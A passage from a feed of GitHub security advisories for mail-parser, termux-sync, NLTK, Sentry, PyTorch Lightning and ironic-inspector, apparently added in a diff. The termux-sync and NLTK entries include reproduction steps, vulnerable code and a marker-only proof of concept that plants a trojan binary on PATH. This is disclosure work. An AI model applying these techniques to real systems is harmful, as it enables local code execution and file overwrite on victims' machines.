+<li><a href="https://github.com/SpamScope/mail-parser/commit/037293158cb291caa96635a54449243d32cd4d96">https://github.com/SpamScope/mail-parser/commit/037293158cb291caa96635a54449243d32cd4d96</a></li>
+<li><a href="https://github.com/SpamScope/mail-parser/commit/5aab122f0d763991604d2c2bcc807c6bf2489464">https://github.com/SpamScope/mail-parser/commit/5aab122f0d763991604d2c2bcc807c6bf2489464</a></li>
+<li><a href="https://github.com/SpamScope/mail-parser/commit/85e53f820d78ae7c955dafbbcd0e20989a735c2c">https://github.com/SpamScope/mail-parser/commit/85e53f820d78ae7c955dafbbcd0e20989a735c2c</a></li>
+<li><a href="https://github.com/SpamScope/mail-parser/releases/tag/4.6.1">https://github.com/SpamScope/mail-parser/releases/tag/4.6.1</a></li>
+<li><a href="https://github.com/advisories/GHSA-r7w7-vpq8-c5vv">https://github.com/advisories/GHSA-r7w7-vpq8-c5vv</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-r7w7-vpq8-c5vv</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-11-16T22:11:08.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[mail-parser] mail-parser: Path Traversal vulnerability in attachment extraction]]></title>
+        <id>https://github.com/advisories/GHSA-fr3h-cpq2-9496</id>
+        <link href="https://github.com/advisories/GHSA-fr3h-cpq2-9496"/>
+        <updated>2026-11-16T22:10:56.000Z</updated>
+        <content type="html"><![CDATA[<h3>Affected versions</h3>
+<table>
+<thead><tr><th>Package</th><th>Vulnerable versions</th><th>Patched version</th></tr></thead>
+<tbody>
+<tr>
+<td>mail-parser</td>
+<td><code>&gt;= 3.8.0, &lt; 4.6.0</code></td>
+<td><code>4.6.0</code></td>
+</tr>
+</tbody>
+</table>
+<p>A path traversal vulnerability was identified in mail-parser when extracting email attachments using the write_attachments() and write_sample() APIs.</p>
+<p>A specially crafted email containing malicious attachment filenames (for example, using directory traversal sequences such as "../" or absolute filesystem paths) could cause files to be written outside the intended output directory. Depending on how the library was used and the permissions of the executing process, this could result in arbitrary file overwrite.</p>
+<p>The vulnerability affects mail-parser versions 3.8.0 through 4.5.0.</p>
+<p>The issue has been addressed by introducing comprehensive filename sanitization and path validation before any file is written to disk. The fix includes:</p>
+<ul>
+<li>Sanitization of attachment filenames before writing.</li>
+<li>Validation that all output paths remain within the intended destination directory.</li>
+<li>Rejection of symbolic link targets.</li>
+<li>Normalization of Windows and POSIX path separators.</li>
+<li>Validation and rejection of invalid or unsafe filenames.</li>
+<li>Protection applied consistently in both write_attachments() and write_sample() APIs.</li>
+</ul>
+<p>Users are strongly encouraged to upgrade to the patched release.</p>
+<h2 id="credits">Credits</h2>
+<p>The vulnerability was responsibly reported by <strong>Niranjan Ganesan</strong> (Security Insights, <a href="https://securityinsights.io/">https://securityinsights.io/</a>, GitHub: @iam-niranjan).</p>
+<p>The vulnerability was analyzed, remediated, and the security fix was implemented by <strong>Fedele Mantuano</strong>, maintainer of mail-parser (LinkedIn: <a href="https://www.linkedin.com/in/fmantuano/">https://www.linkedin.com/in/fmantuano/</a>).</p>
+<p>mail-parser would like to thank Niranjan Ganesan for following a coordinated vulnerability disclosure process and for collaborating throughout the remediation and verification of the fix.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/SpamScope/mail-parser/security/advisories/GHSA-fr3h-cpq2-9496">https://github.com/SpamScope/mail-parser/security/advisories/GHSA-fr3h-cpq2-9496</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-129296">https://nvd.nist.gov/vuln/detail/CVE-2026-129296</a></li>
+<li><a href="https://github.com/SpamScope/mail-parser/pull/165">https://github.com/SpamScope/mail-parser/pull/165</a></li>
+<li><a href="https://github.com/SpamScope/mail-parser/commit/3d6cb7a51f2ad7ea57e529121dbd5d56f29fefe8">https://github.com/SpamScope/mail-parser/commit/3d6cb7a51f2ad7ea57e529121dbd5d56f29fefe8</a></li>
+<li><a href="https://github.com/SpamScope/mail-parser/commit/b0a2e968815f3ed9e129efb0f5f7e935a9dacd1d">https://github.com/SpamScope/mail-parser/commit/b0a2e968815f3ed9e129efb0f5f7e935a9dacd1d</a></li>
+<li><a href="https://github.com/SpamScope/mail-parser/releases/tag/4.6.0">https://github.com/SpamScope/mail-parser/releases/tag/4.6.0</a></li>
+<li><a href="https://github.com/advisories/GHSA-fr3h-cpq2-9496">https://github.com/advisories/GHSA-fr3h-cpq2-9496</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-fr3h-cpq2-9496</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-11-16T22:10:55.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[termux-sync] termux-sync: Arbitrary file write during restore via attacker-controlled manifest source path]]></title>
+        <id>https://github.com/advisories/GHSA-259w-wmqg-fp76</id>
+        <link href="https://github.com/advisories/GHSA-259w-wmqg-fp76"/>
+        <updated>2026-11-16T22:09:25.000Z</updated>
+        <content type="html"><![CDATA[<h3>Affected versions</h3>
+<table>
+<thead><tr><th>Package</th><th>Vulnerable versions</th><th>Patched version</th></tr></thead>
+<tbody>
+<tr>
+<td>termux-sync</td>
+<td><code>&lt;= 1.2.3</code></td>
+<td><code>1.2.4</code></td>
+</tr>
+</tbody>
+</table>
+<p>termux-sync restore trusts fields inside an untrusted backup manifest and uses them as the extraction destination without validation.</p>
+<p>During restore, each archive entry is handled as:</p>
+<p>  src_dir = Path(info.get("source", ...)).parent
+  extract_archive(archive, src_dir, ...)</p>
+<p>extract_archive opens the archive and runs tarfile.extract for every member with no path jail and no filter:</p>
+<p>  with tarfile.open(archive_path, "r:*") as tf:
+      for member in tf.getmembers():
+          tf.extract(member, dest_path, set_attrs=True)</p>
+<p>There is no check that manifest "source" stays under an expected restore root, that tar members stay inside dest_path, or that backup_name used in temporary paths cannot contain ".." or separators.</p>
+<p>Impact:
+A victim who restores a malicious backup (local, shared, or from a compromised GitHub/Google Drive storage backend) can have arbitrary files written anywhere the Termux user can write. Overwriting shell startup files or executable scripts leads to local code execution on later use.</p>
+<p>Reproduction (benign markers only):</p>
+<ol>
+<li>Build a backup directory with home.tar.gz (members: proof filename + optional config names) and manifest.json.</li>
+<li>Set files.home.source to any path whose parent is the desired write directory (e.g. $HOME/dummy_for_parent so parent is $HOME).</li>
+<li>Run the same extract path the tool uses: src_dir = Path(source).parent; tarfile.extract each member into src_dir.</li>
+<li>Observe attacker-controlled files created under $HOME and under other chosen roots (config / shell-rc style overwrite).</li>
+</ol>
+<p>Expected: restore only writes under fixed, validated roots; reject unsafe source values and members that resolve outside dest.
+Actual: write destination is fully controlled by manifest.source; proof files and overwrites appear outside any intended jail.</p>
+<p>Fix direction:</p>
+<ul>
+<li>Do not trust manifest "source" for extract roots; use fixed app-defined destinations</li>
+<li>Sanitize backup_name (basename; reject ".." and separators)</li>
+<li>Extract with tarfile filter="data" (or equivalent boundary checks) and refuse escape</li>
+<li>Treat backups as untrusted input</li>
+</ul>
+<p>Actual result (local marker-only reproduction):</p>
+<p>PROOF path: /data/data/com.termux/files/home/PWNED_BY_TERMUX_SYNC_RESTORE.txt
+PROOF exists? True
+PROOF content:
+PWNED
+This file was written by a malicious termux-sync backup restore path.
+Root cause: manifest files.*.source controls extract destination.</p>
+<p>*** VULN CONFIRMED: arbitrary write to $HOME ***</p>
+<p>important.conf =&gt; secret=ATTACKER_CONTROLLED
+*** VULN CONFIRMED: overwrite under attacker-chosen root ***</p>
+<p>.bashrc_sim shows injected:
+export ATTACKER=1
+*** VULN CONFIRMED: startup-file style overwrite ***</p>
+<p>Extract roots used:
+  home  -&gt; parent($HOME/dummy_for_parent) = $HOME
+  config -&gt; parent(.../victim_sim/nested_dummy) = .../victim_sim</p>
+<p>Reported and credited to Niranj R Mahaswar ( GitHub: @NiranjMahaswar )</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/djunekz/termux-sync/security/advisories/GHSA-259w-wmqg-fp76">https://github.com/djunekz/termux-sync/security/advisories/GHSA-259w-wmqg-fp76</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-86046">https://nvd.nist.gov/vuln/detail/CVE-2026-86046</a></li>
+<li><a href="https://github.com/djunekz/termux-sync/commit/9c8637b280ee3e126885def5ff5b326c289ee7cf">https://github.com/djunekz/termux-sync/commit/9c8637b280ee3e126885def5ff5b326c289ee7cf</a></li>
+<li><a href="https://github.com/djunekz/termux-sync/releases/tag/v1.2.4">https://github.com/djunekz/termux-sync/releases/tag/v1.2.4</a></li>
+<li><a href="https://github.com/advisories/GHSA-259w-wmqg-fp76">https://github.com/advisories/GHSA-259w-wmqg-fp76</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-259w-wmqg-fp76</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-11-16T22:09:24.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[nltk] NLTK dot2img runs Graphviz 'dot' without the trusted-exec chokepoint, enabling local code execution via a writable PATH element]]></title>
+        <id>https://github.com/advisories/GHSA-7mxv-7h3q-9324</id>
+        <link href="https://github.com/advisories/GHSA-7mxv-7h3q-9324"/>
+        <updated>2026-11-16T18:45:54.000Z</updated>
+        <content type="html"><![CDATA[<h3>Affected versions</h3>
+<table>
+<thead><tr><th>Package</th><th>Vulnerable versions</th><th>Patched version</th></tr></thead>
+<tbody>
+<tr>
+<td>nltk</td>
+<td><code>&lt;= 3.10.3</code></td>
+<td><code>3.10.4</code></td>
+</tr>
+</tbody>
+</table>
+<h2 id="summary">Summary</h2>
+<p><code>nltk.parse.dependencygraph.dot2img</code> invokes the Graphviz <code>dot</code> executable without the trusted-execution guarantees that NLTK applies to its other native-tool wrappers. The function resolves <code>dot</code> by bare name and then runs the resolved absolute path with a raw <code>subprocess.run</code>, omitting the ownership/writability check and the loader-environment scrub that <code>nltk.pathsec.spawn_trusted</code> provides. On a POSIX host, a local, unprivileged actor who can write to any group/world-writable directory that appears on the victim's <code>PATH</code> can plant a trojan <code>dot</code>; when the victim later renders a <code>DependencyGraph</code> (for example in a Jupyter notebook, which auto-invokes <code>_repr_svg_</code>) or calls <code>dot2img</code> directly, the planted binary executes as the victim. The advisory GHSA-6hwm-xvph-95vm (CVE-2026-78680) addressed the same untrusted-search-path class for the Graphviz <code>dot</code> invoker in <code>nltk/translate/api.py</code>, but <code>dot2img</code> received only part of that remediation and remains exploitable.</p>
+<h2 id="root-cause">Root Cause</h2>
+<p>NLTK's native-tool security model layers four defenses (documented in <code>nltk/EXTERNAL_TOOL_SECURITY.md</code>): (1) <code>find_binary</code> refuses a current-working-directory-relative match; (2) <code>resolve_trusted_executable</code> verifies the resolved file is a regular file that no other unprivileged user can replace (private parent directories, owner is the user or root, no group/world write bit); (3) shell execution is refused; (4) <code>safe_env</code> scrubs loader and interpreter environment variables before exec. Layers 2, 3, and 4 are reached only through <code>nltk.pathsec.spawn_trusted</code>. <code>dot2img</code> calls <code>find_binary("dot")</code> (layer 1 only), then executes the result with <code>subprocess.run([dot_binary, ...])</code> and no <code>env=</code> argument. Layer 1 rejects only non-absolute matches, so an absolute path returned by the <code>which</code> search stage survives even when the file lives in a writable directory. Because <code>dot2img</code> never calls <code>spawn_trusted</code>, the ownership check and environment scrub never run.</p>
+<pre><code class="language-text">nltk/parse/dependencygraph.py:626   dot_binary = find_binary("dot")          # layer 1 only
+nltk/parse/dependencygraph.py:631   subprocess.run([dot_binary, "-T%s" % t], ...)   # no trust check, no env=
+nltk/parse/dependencygraph.py:638   subprocess.run([dot_binary, "-T%s" % t], ...)   # binary-format branch, same gap
+nltk/internals.py:1034              if searching_bare_name and not os.path.isabs(path): continue  # skips only relative matches
+nltk/translate/api.py:145           process = spawn_trusted(dot_binary, [f"-T{output_format}"], ...)  # hardened sibling
+</code></pre>
+<h2 id="impact">Impact</h2>
+<p>Prerequisites: a POSIX host on which the attacker is a local, unprivileged user (or code) able to write to a group/world-writable directory that appears on the victim's <code>PATH</code>. This includes the commonly cited case of a Homebrew <code>/usr/local/bin</code> with <code>drwxrwxr-x</code> permissions, or a writable directory placed early on <code>PATH</code>. The attacker plants a trojan <code>dot</code> there. When the victim renders a <code>DependencyGraph</code> (notebook <code>_repr_svg_</code> auto-invocation) or calls <code>dot2img</code> directly, the trojan executes as the victim, yielding arbitrary local code execution in the victim's account: a local privilege-escalation and lateral-movement primitive. Because the child environment is not scrubbed, loader-injection variables (for example <code>LD_PRELOAD</code>, <code>DYLD_*</code>, <code>GCONV_PATH</code>) also reach the child, providing an additional execution surface. No control over NLTK inputs is required.</p>
+<h2 id="proof-of-concept">Proof of Concept</h2>
+<p><code>Requires: POSIX host, an importable NLTK build from the affected tree, and Python 3. No third-party dependencies.</code></p>
+<ol>
+<li>Create a world-writable directory and write an executable <code>dot</code> script into it that drops a marker and emits fake SVG.</li>
+<li>Prepend that directory to <code>PATH</code> and run from a neutral working directory (so this is not the current-working-directory vector).</li>
+<li>Show that <code>resolve_trusted_executable</code> refuses the planted binary (so the hardened path would raise) while <code>dot2img</code> executes it.</li>
+</ol>
+<pre><code class="language-python">import os, stat, tempfile, subprocess, sys
+d = tempfile.mkdtemp()
+dot = os.path.join(d, "dot")
+with open(dot, "w") as f:
+    f.write("#!/bin/sh\ntouch " + os.path.join(d, "MARKER") + "\necho '&lt;svg&gt;&lt;!-- planted dot ran --&gt;&lt;/svg&gt;'\n")
+os.chmod(dot, 0o777)
+os.chmod(d, 0o777)
+os.environ["PATH"] = d + os.pathsep + os.environ["PATH"]
+os.chdir("/")
+from nltk.pathsec import resolve_trusted_executable
+from nltk.parse.dependencygraph import dot2img
+print("resolve_trusted_executable(planted dot):", resolve_trusted_executable(os.path.join(d, "dot")))
+out = dot2img("digraph G { a -&gt; b }")
+print("dot2img stdout:", repr(out))
+print("planted dot executed (marker created):", os.path.exists(os.path.join(d, "MARKER")))
+</code></pre>
+<pre><code class="language-text">resolve_trusted_executable(planted dot): None
+dot2img stdout: '&lt;svg&gt;&lt;!-- planted dot ran --&gt;&lt;/svg&gt;\n'
+planted dot executed (marker created): True
+</code></pre>
+<h2 id="attack-chain">Attack Chain</h2>
+<ol>
+<li><strong>Exposure:</strong> On a shared POSIX host, a group/world-writable directory is present on the victim's <code>PATH</code> (for example a writable directory early on <code>PATH</code>, or a Homebrew <code>/usr/local/bin</code> with group-write). The attacker writes a trojan <code>dot</code> into it.</li>
+<li><strong>Control:</strong> The attacker fully controls the contents of the planted <code>dot</code> file; no control over NLTK inputs is needed.</li>
+<li><strong>Path:</strong> The victim renders a <code>DependencyGraph</code> (notebook display triggers <code>_repr_svg_</code> at <code>nltk/parse/dependencygraph.py:209</code>, which calls <code>dot2img</code>) or calls <code>dot2img</code> directly.</li>
+<li><strong>Guard:</strong> <code>find_binary("dot")</code> applies layer 1 only (<code>nltk/internals.py:1034</code>), which discards a relative current-working-directory match but returns the attacker's absolute path from the <code>which</code> stage; <code>dot2img</code> never invokes <code>resolve_trusted_executable</code> (layer 2) or <code>safe_env</code> (layer 4), unlike the hardened sibling <code>nltk/translate/api.py:145</code>.</li>
+<li><strong>Primitive:</strong> <code>subprocess.run([dot_binary, "-T%s" % t], ...)</code> (<code>nltk/parse/dependencygraph.py:631</code> and <code>:638</code>) executes the untrusted absolute path with the full inherited environment.</li>
+<li><strong>Result:</strong> Arbitrary local code execution as the victim, plus a loader-injection surface via the unscrubbed environment.</li>
+</ol>
+<h2 id="bypass-evidence">Bypass Evidence</h2>
+<p>Canonical prior advisory: GHSA-6hwm-xvph-95vm (CVE-2026-78680), "Uncontrolled search path when invoking the Graphviz 'dot' binary" (CWE-426/CWE-427), patched at <code>&gt;= 3.10.3</code>. That remediation was two-part: a uniform layer-1 current-working-directory refusal in <code>find_binary</code>, and a routing of native-tool <code>dot</code> invocations through <code>nltk.pathsec.spawn_trusted</code> (layers 2 and 4). Inspection of the current released tree (nltk 3.10.3) shows <code>dot2img</code> received the layer-1 change (the function was rewritten from a bare <code>subprocess.run(["dot", ...])</code> to <code>find_binary("dot")</code> plus a run of the absolute path, with a CWE-426/427 comment at <code>nltk/parse/dependencygraph.py:622-625</code>) but did NOT receive the <code>spawn_trusted</code> routing. The sibling <code>nltk/translate/api.py:145</code> does route through <code>spawn_trusted</code>, and <code>nltk/EXTERNAL_TOOL_SECURITY.md</code> lists Graphviz <code>dot</code> only under <code>translate/api.py</code>; <code>dot2img</code> is absent from the hardened-wrapper inventory. Attempts to invalidate the finding all failed: (a) the claim that the fix covers all <code>dot</code> resolution is refuted because layer 1 filters only non-absolute matches and <code>dot2img</code> never reaches layers 2/4; (b) the duplicate hypothesis is refuted by a negative control, planting <code>./dot</code> in the working directory with none on <code>PATH</code> makes <code>find_binary("dot")</code> raise <code>LookupError</code>, so the prior fix's working-directory guard still fires and this is the distinct residual ownership/environment gap; (c) the "system dot shadows the trojan" objection is refuted because realistic exploitation prepends the writable directory on <code>PATH</code> or replaces a <code>dot</code> already living in a writable <code>PATH</code> directory; (d) both the text and binary format branches share the identical unguarded exec, so it is not format-specific. A fresh PoC on the examined tree confirms <code>resolve_trusted_executable</code> refuses the planted binary while <code>dot2img</code> executes it.</p>
+<h2 id="affected-versions">Affected Versions</h2>
+<ul>
+<li><code>Ecosystem: pip (PyPI)</code></li>
+<li><code>Package: nltk</code></li>
+<li><code>Confirmed affected range: &lt;= 3.10.3</code></li>
+<li><code>Latest release checked: 3.10.3 (PyPI, latest published release as of the review date; source tree VERSION == 3.10.3)</code></li>
+<li><code>Fix status: 3.10.4</code></li>
+</ul>
+<p>The <code>dot2img</code> function has invoked <code>dot</code> via a raw subprocess since well before the prior advisory. The prior advisory's <code>spawn_trusted</code> standardization routed only the sibling <code>translate/api.py</code> invoker through the trusted-execution chokepoint, so this residual gap in <code>dot2img</code> exists from at least that remediation release onward and remains present in the latest published release (3.10.3). Precise introduction and remediation boundaries below 3.10.3 could not be independently established in this environment (no git tags or release history in the checkout); the confirmed statement is that the latest published release is affected and no fix for <code>dot2img</code> exists.</p>
+<h2 id="suggested-fix">Suggested Fix</h2>
+<p>Route <code>dot2img</code>'s execution through <code>nltk.pathsec.spawn_trusted(dot_binary, ["-T%s" % t], input=...)</code>, mirroring the sibling <code>nltk/translate/api.py</code>, so that the ownership/writability check (layer 2) and the loader-environment scrub (layer 4) apply, and handle <code>TrustError</code>/<code>OSError</code> with the same refusal pattern used at <code>nltk/translate/api.py:152-157</code>. Apply the change to both the text-format and binary-format branches. Add Graphviz <code>dot</code> under <code>nltk/parse/dependencygraph.py</code> to the per-wrapper inventory in <code>nltk/EXTERNAL_TOOL_SECURITY.md</code> so the second invoker is tracked. Interim mitigation without a code change: ensure no group/world-writable directory appears on the <code>PATH</code> of any account that renders NLTK dependency graphs, and install Graphviz in a directory writable only by the user or root.</p>
+<hr>
+<p>Reported by zx (GitHub: @manus-pi).</p>
+<h2 id="fix-status-2026-09-28">Fix status (2026-09-28)</h2>
+<p>Status: IN PROGRESS (fix on an open pull request, not yet on develop).</p>
+<p>Two open pull requests carry a fix.</p>
+<p>PR: #3753 "[Do not merge yet] Fix GHSA-8mgp-746c-j5xp: URL-scheme bypass of pathsec.validate_path", open; head da55cab0e at the time of this note (a develop merge on top of 238f81500, the head on which the verdicts below were measured). Fix commit: cf12a5e6a (internals.java() refuses a binary that resolve_trusted_executable rejects, _java_child_env drops the loader environment and pins PATH, dependencygraph.dot2img runs through pathsec.spawn_trusted). Probe: nltk/test/unit/security_probes/ghsa_7mxv_7h3q_9324.py (on that PR); verdict on its head: FIXED (planted absolute java refused with TrustError; loader and JVM environment scrubbed).</p>
+<p>PR: #3887 "Resolve every executed tool binary absolute-only: prover9/mace4, megam, tadm, java, hunpos (untrusted search path, CWE-426/427)", open; head 3ac1c5641 at the time of this note (a develop merge on top of 16b1de8ee, the head on which the verdicts below were measured). Fix commits: 992884a02 (the JVM is resolved before spawning and spawned through spawn_trusted) and b002a7288 (dot is spawned through the trusted path in dependencygraph). The #3753 probe run against this head reports STATIC (the planted java is refused with LookupError before the trust guard is reached).</p>
+<p>The probe run against develop 2fa3f48fe: VULNERABLE (java() executed a planted untrusted binary from a writable directory).</p>
+<p>Release: none.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/nltk/nltk/security/advisories/GHSA-7mxv-7h3q-9324">https://github.com/nltk/nltk/security/advisories/GHSA-7mxv-7h3q-9324</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-128134">https://nvd.nist.gov/vuln/detail/CVE-2026-128134</a></li>
+<li><a href="https://github.com/nltk/nltk/pull/3887">https://github.com/nltk/nltk/pull/3887</a></li>
+<li><a href="https://github.com/nltk/nltk/commit/b002a7288c22db86fd6ca2d9526e3f91d6fda797">https://github.com/nltk/nltk/commit/b002a7288c22db86fd6ca2d9526e3f91d6fda797</a></li>
+<li><a href="https://github.com/nltk/nltk/releases/tag/v3.10.4">https://github.com/nltk/nltk/releases/tag/v3.10.4</a></li>
+<li><a href="https://github.com/advisories/GHSA-7mxv-7h3q-9324">https://github.com/advisories/GHSA-7mxv-7h3q-9324</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-7mxv-7h3q-9324</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-11-16T18:45:51.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[sentry] Sentry's improper authentication on SAML SSO process allows user identity linking]]></title>
+        <id>https://github.com/advisories/GHSA-rcmw-7mc7-3rj7</id>
+        <link href="https://github.com/advisories/GHSA-rcmw-7mc7-3rj7"/>
+        <updated>2026-11-16T16:19:02.000Z</updated>
+        <content type="html"><![CDATA[<h3>Affected versions</h3>
+<table>
+<thead><tr><th>Package</th><th>Vulnerable versions</th><th>Patched version</th></tr></thead>
+<tbody>
+<tr>
+<td>sentry</td>
+<td><code>&gt;= 21.12.0, &lt; 26.4.1</code></td>
+<td><code>26.4.1</code></td>
+</tr>
+</tbody>
+</table>
+<h3 id="impact">Impact</h3>
+<p>A critical vulnerability was discovered in the SAML SSO implementation of Sentry. It was reported to us via Sentry's private bug bounty program.</p>
+<p>The vulnerability allows an attacker to take over any user account by using a malicious SAML Identity Provider and another organization on the same Sentry instance. The victim email address must be known in order to exploit this vulnerability.</p>
+<p>Self-hosted users are only vulnerable if the following conditions are met:</p>
+<ul>
+<li>They have more than one organization configured (SENTRY_SINGLE_ORGANIZATION = False).</li>
+<li>A malicious user has existing access and permissions to modify SSO settings for another organization in their multi-organization instance.</li>
+</ul>
+<h3 id="patches">Patches</h3>
+<ul>
+<li><a href="https://sentry.io/">Sentry SaaS</a>: The fix was deployed in April. No action is required.</li>
+<li><a href="https://github.com/getsentry/self-hosted">Self-Hosted Sentry</a>: If only a single organization is allowed (SENTRY_SINGLE_ORGANIZATION = True), then no action is needed. Sentry recommends upgrading to version 26.4.1 or higher.</li>
+</ul>
+<h3 id="workarounds">Workarounds</h3>
+<p>User account-based two-factor authentication prevents an attacker from being able to complete authentication with a victim's user account. Organization administrators cannot do this on a user's behalf, this requires individual users to ensure 2FA has been enabled for their account.</p>
+<p>Users can manage their two-factor authentication settings through Account Settings &gt; <a href="https://sentry.io/settings/account/security/">Security</a> page. For step-by-step details, please see the Sentry <a href="https://sentry.zendesk.com/hc/en-us/articles/46773315774235-How-do-I-enable-two-factor-authentication-2FA-on-my-Sentry-account">helpdesk article</a>.</p>
+<h3 id="resources">Resources</h3>
+<ul>
+<li><a href="https://github.com/getsentry/sentry/pull/113720">https://github.com/getsentry/sentry/pull/113720</a></li>
+</ul>
+<p>Please note that this is distinct vulnerability from the similar <a href="https://github.com/getsentry/sentry/security/advisories/GHSA-7pq6-v88g-wf3w">https://github.com/getsentry/sentry/security/advisories/GHSA-7pq6-v88g-wf3w</a> from 2025.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/getsentry/sentry/security/advisories/GHSA-rcmw-7mc7-3rj7">https://github.com/getsentry/sentry/security/advisories/GHSA-rcmw-7mc7-3rj7</a></li>
+<li><a href="https://github.com/getsentry/sentry/pull/113720">https://github.com/getsentry/sentry/pull/113720</a></li>
+<li><a href="https://github.com/getsentry/sentry/commit/0c67558ae7fe08738912d4c5233b53ead048da3b">https://github.com/getsentry/sentry/commit/0c67558ae7fe08738912d4c5233b53ead048da3b</a></li>
+<li><a href="https://github.com/getsentry/sentry/releases/tag/26.4.1">https://github.com/getsentry/sentry/releases/tag/26.4.1</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-42354">https://nvd.nist.gov/vuln/detail/CVE-2026-42354</a></li>
+<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/sentry/PYSEC-2026-534.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/sentry/PYSEC-2026-534.yaml</a></li>
+<li><a href="https://pypi.org/project/sentry">https://pypi.org/project/sentry</a></li>
+<li><a href="https://github.com/advisories/GHSA-rcmw-7mc7-3rj7">https://github.com/advisories/GHSA-rcmw-7mc7-3rj7</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-rcmw-7mc7-3rj7</uri>
+        </author>
+        <category label="severity" term="CRITICAL"/>
+        <published>2026-04-30T20:44:24.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[lightning] PyTorch Lightning path traversal vulnerability]]></title>
+        <id>https://github.com/advisories/GHSA-4cv3-v7pv-rfhf</id>
+        <link href="https://github.com/advisories/GHSA-4cv3-v7pv-rfhf"/>
+        <updated>2026-11-16T16:13:01.000Z</updated>
+        <content type="html"><![CDATA[<h3>Affected versions</h3>
+<table>
+<thead><tr><th>Package</th><th>Vulnerable versions</th><th>Patched version</th></tr></thead>
+<tbody>
+<tr>
+<td>lightning</td>
+<td><code>&lt; 2.4.0</code></td>
+<td><code>2.4.0</code></td>
+</tr>
+</tbody>
+</table>
+<p>In lightning-ai/pytorch-lightning version 2.3.2, a vulnerability exists in the <code>LightningApp</code> when running on a Windows host. The vulnerability occurs at the <code>/api/v1/upload_file/</code> endpoint, allowing an attacker to write or overwrite arbitrary files by providing a crafted filename. This can lead to potential remote code execution (RCE) by overwriting critical files or placing malicious files in sensitive locations.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-8019">https://nvd.nist.gov/vuln/detail/CVE-2024-8019</a></li>
+<li><a href="https://github.com/lightning-ai/pytorch-lightning/commit/330af381de88cff17515418a341cbc1f9f127f9a">https://github.com/lightning-ai/pytorch-lightning/commit/330af381de88cff17515418a341cbc1f9f127f9a</a></li>
+<li><a href="https://huntr.com/bounties/2754298b-5af5-48ef-8b38-999093ddf2bd">https://huntr.com/bounties/2754298b-5af5-48ef-8b38-999093ddf2bd</a></li>
+<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/lightning/PYSEC-2026-3970.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/lightning/PYSEC-2026-3970.yaml</a></li>
+<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/pytorch-lightning/PYSEC-2026-507.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/pytorch-lightning/PYSEC-2026-507.yaml</a></li>
+<li><a href="https://pypi.org/project/pytorch-lightning">https://pypi.org/project/pytorch-lightning</a></li>
+<li><a href="https://github.com/advisories/GHSA-4cv3-v7pv-rfhf">https://github.com/advisories/GHSA-4cv3-v7pv-rfhf</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-4cv3-v7pv-rfhf</uri>
+        </author>
+        <category label="severity" term="CRITICAL"/>
+        <published>2025-03-20T12:32:46.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[ironic-inspector] Injection vulnerability that affects ironic-discoverd]]></title>
+        <id>https://github.com/advisories/GHSA-x64g-wjmw-w328</id>
+        <link href="https://github.com/advisories/GHSA-x64g-wjmw-w328"/>
+        <updated>2026-11-16T16:10:03.000Z</updated>
+        <content type="html"><![CDATA[<h3>Affected versions</h3>
+<table>
+<thead><tr><th>Package</th><th>Vulnerable versions</th><th>Patched version</th></tr></thead>
+<tbody>
+<tr>
+<td>ironic-inspector</td>
+<td><code>&lt; 2.2.2</code></td>
+<td><code>2.2.2</code></td>
+</tr>
+</tbody>
+</table>
+<p>OpenStack Ironic Inspector (aka ironic-inspector or ironic-discoverd), when debug mode is enabled, might allow remote attackers to access the Flask console and execute arbitrary Python code by triggering an error.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2015-5306">https://nvd.nist.gov/vuln/detail/CVE-2015-5306</a></li>
+<li><a href="https://access.redhat.com/errata/RHSA-2015:1929">https://access.redhat.com/errata/RHSA-2015:1929</a></li>
+<li><a href="https://bugs.launchpad.net/ironic-inspector/+bug/1506419">https://bugs.launchpad.net/ironic-inspector/+bug/1506419</a></li>
+<li><a href="https://bugzilla.redhat.com/show_bug.cgi?id=1273698">https://bugzilla.redhat.com/show_bug.cgi?id=1273698</a></li>
+<li><a href="http://rhn.redhat.com/errata/RHSA-2015-2685.html">http://rhn.redhat.com/errata/RHSA-2015-2685.html</a></li>
